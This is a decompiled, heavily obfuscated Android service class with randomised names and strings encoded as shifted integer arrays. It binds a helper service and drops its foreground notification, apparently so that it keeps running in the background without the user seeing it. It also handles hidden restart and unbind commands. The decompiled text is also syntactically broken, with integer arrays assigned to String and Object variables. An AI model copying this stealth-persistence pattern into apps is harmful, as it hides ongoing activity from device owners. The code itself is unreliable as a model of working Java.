package tev.piqgahor;
public class IYmwa143SD1 extends android.app.Service {
    private boolean OWjoZ0N78;
    private final android.content.ServiceConnection WUzOWTY155;
    private tev.piqgahor.fxn1Y9 XG169vpXj;
    private boolean ZLthNk4533;

    public IYmwa143SD1()
    {
        this.XG169vpXj = 0;
        this.WUzOWTY155 = new tev.piqgahor.IYmwa143SD1$1(this);
        this.ZLthNk4533 = 0;
        this.OWjoZ0N78 = 0;
        return;
    }

    private void T6f74f()
    {
        if ((!this.OWjoZ0N78) && ((android.os.Build$VERSION.SDK_INT >= 17) && (this.XG169vpXj != null))) {
            this.OWjoZ0N78 = 1;
            this.XG169vpXj.Ihp3e929(this);
            this.stopForeground(1);
        }
        return;
    }

    static synthetic void access$0(tev.piqgahor.IYmwa143SD1 p0, tev.piqgahor.fxn1Y9 p1)
    {
        p0.XG169vpXj = p1;
        return;
    }

    static synthetic void access$1(tev.piqgahor.IYmwa143SD1 p0)
    {
        p0.T6f74f();
        return;
    }

    public void UnbindService()
    {
        if (this.ZLthNk4533) {
            String v1_10 = new int[39];
            v1_10 = {19, 110, 102, 135, 116, 133, 135, 89, 130, 133, 120, 122, 133, 130, 136, 129, 119, 102, 120, 133, 137, 124, 134, 120, 112, 51, 104, 129, 117, 124, 129, 119, 102, 120, 133, 137, 124, 118, 120};
            tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v1_10));
            try {
                this.unbindService(this.WUzOWTY155);
            } catch (Exception v0) {
                String v1_2 = new int[56];
                v1_2 = {47, 138, 130, 163, 144, 161, 163, 117, 158, 161, 148, 150, 161, 158, 164, 157, 147, 130, 148, 161, 165, 152, 162, 148, 140, 79, 132, 157, 145, 152, 157, 147, 130, 148, 161, 165, 152, 146, 148, 79, 92, 79, 116, 167, 146, 148, 159, 163, 152, 158, 157, 79, 80, 80, 80, 79};
                StringBuilder v2_1 = new StringBuilder(String.valueOf(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v1_2)));
                if (v0 == null) {
                    String v1_6 = ".";
                } else {
                    v1_6 = v0.getMessage();
                }
                tev.piqgahor.WqukitNJL.VkNmRD0688(v2_1.append(v1_6).toString());
            }
            this.ZLthNk4533 = 0;
        } else {
            String v1_12 = new int[58];
            v1_12 = {29, 120, 112, 145, 126, 143, 145, 99, 140, 143, 130, 132, 143, 140, 146, 139, 129, 112, 130, 143, 147, 134, 144, 130, 122, 61, 114, 139, 127, 134, 139, 129, 112, 130, 143, 147, 134, 128, 130, 61, 95, 114, 113, 61, 127, 134, 139, 129, 130, 129, 61, 90, 61, 131, 126, 137, 144, 130};
            tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v1_12));
        }
        return;
    }

    public android.os.IBinder onBind(android.content.Intent p2)
    {
        return 0;
    }

    public void onCreate()
    {
        super.onCreate();
        String v0_1 = new int[36];
        v0_1 = {48, 139, 131, 164, 145, 162, 164, 118, 159, 162, 149, 151, 162, 159, 165, 158, 148, 131, 149, 162, 166, 153, 163, 149, 141, 80, 115, 162, 149, 145, 164, 149, 80, 81, 81, 81};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_1), 1);
        return;
    }

    public void onDestroy()
    {
        String v0_1 = new int[37];
        v0_1 = {15, 106, 98, 131, 112, 129, 131, 85, 126, 129, 116, 118, 129, 126, 132, 125, 115, 98, 116, 129, 133, 120, 130, 116, 108, 47, 83, 116, 130, 131, 129, 126, 136, 47, 48, 48, 48};
        tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v0_1));
        this.UnbindService();
        super.onDestroy();
        return;
    }

    public int onStartCommand(android.content.Intent p13, int p14, int p15)
    {
        int v7_3 = 0;
        if (p13 == null) {
            int v7_1 = new int[46];
            v7_1 = {40, 131, 123, 156, 137, 154, 156, 110, 151, 154, 141, 143, 154, 151, 157, 150, 140, 123, 141, 154, 158, 145, 155, 141, 133, 72, 151, 150, 123, 156, 137, 154, 156, 107, 151, 149, 149, 137, 150, 140, 72, 106, 109, 111, 113, 118};
            tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v7_1));
            android.content.Intent v6_1 = new android.content.Intent(this, tev.piqgahor.ttnC03lWapO);
            int v7_6 = new int[5];
            v7_6 = {4, 120, 125, 116, 105};
            v6_1.putExtra(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v7_6), 1);
            this.bindService(v6_1, this.WUzOWTY155, 1);
            this.ZLthNk4533 = 1;
            this.T6f74f();
            int v7_10 = new int[44];
            v7_10 = {34, 125, 117, 150, 131, 148, 150, 104, 145, 148, 135, 137, 148, 145, 151, 144, 134, 117, 135, 148, 152, 139, 149, 135, 127, 66, 145, 144, 117, 150, 131, 148, 150, 101, 145, 143, 143, 131, 144, 134, 66, 103, 112, 102};
            tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v7_10));
            v7_3 = 1;
        } else {
            Object[] v9_7 = new int[7];
            v9_7 = {14, 131, 124, 112, 119, 124, 114};
            if (!p13.getBooleanExtra(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v9_7), 0)) {
            } else {
                Object[] v9_0 = new int[8];
                v9_0 = {37, 151, 138, 152, 153, 134, 151, 153};
                boolean v5 = p13.getBooleanExtra(tev.piqgahor.WqukitNJL.ZkeTGysUO016(v9_0), 0);
                this.UnbindService();
                String v1 = 0;
                String v3 = 0;
                try {
                    android.content.Intent v4_1 = new android.content.Intent(this, tev.piqgahor.ttnC03lWapO);
                    Object[] v9_5 = new int[12];
                    v9_5 = {29, 134, 139, 131, 140, 143, 138, 124, 145, 150, 141, 130};
                    Object[] v9_6 = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v9_5);
                    String v10_4 = new int[8];
                    v10_4 = {21, 135, 122, 136, 137, 118, 135, 137};
                    v4_1.putExtra(v9_6, tev.piqgahor.WqukitNJL.ZkeTGysUO016(v10_4));
                    this.stopService(v4_1);
                } catch (Exception v2_2) {
                    Object[] v9_11 = new int[16];
                    v9_11 = {12, 85, 120, 120, 113, 115, 109, 120, 77, 126, 115, 129, 121, 113, 122, 128};
                    v1 = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v9_11);
                    if (v2_2 == null) {
                        if (v1 != null) {
                            Object[] v9_14 = new Object[4];
                            String v10_7 = new int[32];
                            v10_7 = {36, 127, 118, 137, 151, 152, 133, 150, 152, 118, 137, 135, 137, 141, 154, 137, 150, 129, 68, 151, 152, 133, 150, 152, 119, 137, 150, 154, 141, 135, 137, 68};
                            v9_14[0] = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v10_7);
                            v9_14[1] = v1;
                            String v10_1 = new int[12];
                            v10_1 = {3, 72, 123, 102, 104, 115, 119, 108, 114, 113, 61, 35};
                            v9_14[2] = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v10_1);
                            v9_14[3] = v3;
                            tev.piqgahor.WqukitNJL.VkNmRD0688(tev.piqgahor.WqukitNJL.mvoGCr4741(v9_14));
                        }
                    } else {
                        v3 = v2_2.getMessage();
                    }
                } catch (Exception v2_1) {
                    Object[] v9_9 = new int[9];
                    v9_9 = {8, 91, 109, 107, 125, 122, 113, 124, 129};
                    v1 = tev.piqgahor.WqukitNJL.ZkeTGysUO016(v9_9);
                    if (v2_1 == null) {
                    } else {
                        v3 = v2_1.getMessage();
                    }
                } catch (Exception v2_0) {
                    v1 = "";
                    if (v2_0 == null) {
                    } else {
                        v3 = v2_0.getMessage();
                    }
                }
                if (!v5) {
                    this.stopSelf();
                } else {
                    this.startService(v4_1);
                }
            }
        }
        return v7_3;
    }
}
